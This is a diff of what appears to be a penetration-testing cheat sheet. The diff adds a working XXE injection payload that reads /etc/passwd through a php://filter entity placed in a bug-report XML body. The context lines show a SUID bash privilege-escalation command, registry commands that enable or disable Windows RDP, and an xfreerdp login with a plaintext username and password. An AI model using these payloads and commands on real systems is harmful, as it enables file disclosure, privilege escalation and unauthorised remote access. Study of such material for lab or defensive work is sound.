@@ -213,7 +213,19 @@ chmod +s /bin/bash
 > 1. enable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 > 1. disable --- reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
 
-
+##### XXE injection
+```bash
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>&xxe;</cwe>
+		<cvss>&xxe;</cvss>
+		<reward>&xxe;</reward>
+		</bugreport> 
+```
+  
+  
 ##### Access Windows box via xfreerdp
 > 1. xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389
 
